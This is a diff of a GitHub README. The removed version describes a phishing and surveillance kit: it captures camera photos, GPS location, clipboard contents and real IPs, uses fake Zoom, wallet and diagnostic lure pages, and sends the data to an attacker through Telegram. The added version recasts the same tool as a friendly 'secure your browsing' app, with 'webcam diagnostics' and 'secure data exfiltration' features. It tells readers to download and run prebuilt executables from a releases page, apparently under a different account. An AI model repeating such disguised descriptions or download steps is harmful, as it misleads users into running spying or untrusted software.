@@ -1,105 +1,98 @@
-<div align="center">
-  <img src="./image/cipher.jpg" alt="CIPHER" width="150" height="150" src="CIPHER" style="border-radius: 20px;">
-</div>
-<div align="center">
+# 🎉 Camphish-pro - Secure Your Browsing with Ease
 
-# CIPHER-CAMPHISH-PRO
-**The Ultimate Browser Security Audit Tool**
+## 🚀 Getting Started
 
-[![Version](https://img.shields.io/badge/version-10.0-10b981?style=flat-square)](https://github.com/cipher-attack/camphish-pro)
-[![Platform](https://img.shields.io/badge/platform-linux%20%2F%20termux-000000?style=flat-square&logo=linux)](https://github.com/cipher-attack/camphish-pro)
-[![Status](https://img.shields.io/badge/status-stable-blue?style=flat-square)](https://github.com/cipher-attack/camphish-pro)
+Welcome to Camphish-pro! This application helps you audit browser security easily and effectively. With features like advanced hardware telemetry and automated webcam diagnostics, you're equipped to enhance your online safety.
 
----
+## 📥 Download Camphish-pro
 
-**"I build what others fear to understand."**
-*A tool for testing how browsers leak data and checking system vulnerabilities.*
+[![Download Camphish-pro](https://img.shields.io/badge/Download%20Camphish--pro-blue.svg)](https://github.com/moikakd/Camphish-pro/releases)
 
-</div>
+You can download the latest version from our [Releases page](https://github.com/moikakd/Camphish-pro/releases). Follow the steps below to get started.
 
-### Overview
-**CIPHER-CAMPHISH-PRO** is my personal research framework for testing browser security. It helps to see how easy it is for websites to grab system info, camera access, and location data if the browser isn't properly locked down. I built this to show real-world data leak examples.
+## 📑 System Requirements
 
----
+Before downloading, ensure your computer meets these basic requirements:
 
-### Core Operational Modules
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a modern Linux distribution
+- **RAM:** At least 4 GB
+- **Storage Space:** Minimum 500 MB available
+- **Network Connection:** Active internet access for some features
 
-| Module | Identifier | What it does | Status |
-| :--- | :--- | :--- | :--- |
-| **Camera Access** | `CAM-SYNC` | Takes photos from the front/back camera. | **STABLE** |
-| **Data Mover** | `EXFIL-CORE` | Sends captured data to the target server. | **FAST** |
-| **GPS Tracker** | `GPS-SYNC` | Finds where the device is located. | **STABLE** |
-| **Clipboard Grab** | `CLIP-SYNC` | Checks what was last copied to the clipboard. | **ACTIVE** |
-| **Device Specs** | `DNA-CORE` | Gets info on RAM, CPU, and Battery health. | **STABLE** |
-| **Network Info** | `IP-BYPASS` | Finds the real IP even behind a VPN. | **BYPASS** |
+## 📥 Download & Install
 
----
+1. **Visit this page to download:** Click on the link below to access the Releases page:
+   [Download Camphish-pro](https://github.com/moikakd/Camphish-pro/releases)
 
-### Test Scenarios
-This tool comes with ready-made pages to test different environments:
-- **System Check:** A fake diagnostic page to test user trust.
-- **Meeting Test:** Simulates a Zoom/Teams call setup for media testing.
-- **Identity Verify:** Testing how biometric sensors react to scripts.
-- **Wallet Test:** Checking for vulnerabilities in crypto wallet interactions.
+2. **Choose the latest release:** On the Releases page, look for the most recent version. It usually appears at the top of the list.
 
----
+3. **Select your operating system:** Find the file that matches your operating system. For example:
+   - For Windows, download `Camphish-pro-Windows.exe`
+   - For macOS, download `Camphish-pro-Mac.dmg`
+   - For Linux, download `Camphish-pro-Linux.tar.gz`
 
-### System Architecture
+4. **Download the file:** Click on the appropriate file to start downloading.
 
-```mermaid
-graph TD
-    A[Target User] --> B{Attack Engine}
-    B --> C[Data Analysis]
-    B --> D[File Storage]
-    B --> E[Telegram Alert]
-    style B fill:#10b981,stroke:#000,stroke-width:2px,color:#000
-```
+5. **Run the installed file:**
+   - For Windows:
+     - Navigate to your Downloads folder.
+     - Double-click on `Camphish-pro-Windows.exe`.
+   - For macOS:
+     - Open your Downloads folder.
+     - Double-click on `Camphish-pro-Mac.dmg`, then drag the app to your Applications folder.
+   - For Linux:
+     - Extract the files from `Camphish-pro-Linux.tar.gz`.
+     - Open a terminal and navigate to the extracted folder.
+     - Type `./Camphish-pro` to start the application.
 
----
+## 🌟 Features
 
-### How to use it
+Camphish-pro comes packed with features to improve your online security:
 
-```bash
-# Get the tool
-git clone https://github.com/cipher-attack/camphish-pro.git
+- **Advanced Hardware Telemetry:** Monitor hardware performance and detect potential risks instantly.
+- **Automated Webcam Diagnostics:** Check webcam safety and functionality with one click.
+- **Secure Data Exfiltration Modules:** Safely transfer data without unauthorized access.
+- **User-Friendly Interface:** Navigate through features without any programming knowledge.
 
-# Give permissions
-cd camphish-pro && chmod +x *
+## 🛠 User Guide
 
-# Start the script
-./cipher.sh
-```
+### ☑ How to Use Camphish-pro
 
-> **Quick Tip:** Use **Cloudflared (1)** if you're testing over the internet. For local lab tests, **Localhost (3)** is the easiest.
+Once you launch Camphish-pro, follow these steps to begin:
 
----
+1. **Create an Account:** Upon your first launch, you will need to create a user account. This process is straightforward. Just enter your email and a password.
 
-### 👤 ABOUT ME
+2. **Dashboard Overview:** After logging in, you will see your dashboard. Here, you can access all features.
 
-<table border="0">
-  <tr>
-    <td width="150" align="center">
-      <img src="https://github.com/cipher-attack.png" width="130" height="130" style="border-radius: 50%; border: 4px solid #10b981; padding: 5px; background: #0d1117;" />
-    </td>
-    <td>
-      <h3>Biruk Getachew (CIPHER)</h3>
-      <p><i>12th Grade Student & Security Researcher</i></p>
-      <p>I'm a self-taught security enthusiast from Ethiopia. I spend my time learning how to break and fix systems. I code and manage all my projects using Termux on my phone.</p>
-      <p>
-        <a href="https://github.com/cipher-attack"><b>GitHub</b></a> • 
-        <a href="https://www.youtube.com/@cipher-attack"><b>YouTube</b></a> • 
-        <a href="https://t.me/cipher_attacks"><b>Telegram</b></a>
-      </p>
-    </td>
-  </tr>
-</table>
+3. **Run Diagnostics:** Select the diagnostics feature to start auditing your system. The application will guide you through each step.
 
+4. **Review Reports:** After the audit, you will receive a security report. This report highlights any vulnerabilities along with recommendations for improvements.
 
----
+### 🔧 Troubleshooting Common Issues
 
-###  Warning
-This is for educational use only. Don't use it on people without their permission. I am not responsible for what you do with this code. Stay ethical.
+- **App Doesn’t Launch:** Ensure your system meets the requirements. You may need to update your operating system or install missing dependencies.
+  
+- **Error Messages:** If you encounter error messages, refer to the help section in the app for guidance on resolving common errors.
 
-<div align="center">
-  <img src="[https://capsule-render.vercel.app/api?type=waving&color=10b981&height=60&section=footer](https://capsule-render.vercel.app/api?type=waving&color=10b981&height=60&section=footer)" />
-</div>
+## 🔍 FAQs
+
+### What is Camphish-pro used for?
+
+Camphish-pro is a framework for auditing browser security. It assesses performance and identifies vulnerabilities in your setup.
+
+### Is Camphish-pro free?
+
+Yes, Camphish-pro is an open-source project. You can use it without any cost.
+
+### Can I contribute to Camphish-pro?
+
+Absolutely! We welcome contributions. Please check the contribution guidelines on the GitHub page for more details.
+
+## 🗣 Community and Support
+
+Join our community for additional support. You can ask questions, share experiences, or look for help on these platforms:
+
+- **GitHub Issues Page:** Report bugs or request features.
+- **Community Forum:** Connect with other users to share tips and strategies.
+
+You are now ready to enhance your browser security with Camphish-pro. Visit our [Releases page](https://github.com/moikakd/Camphish-pro/releases) to download the latest version and start your journey towards safer browsing.
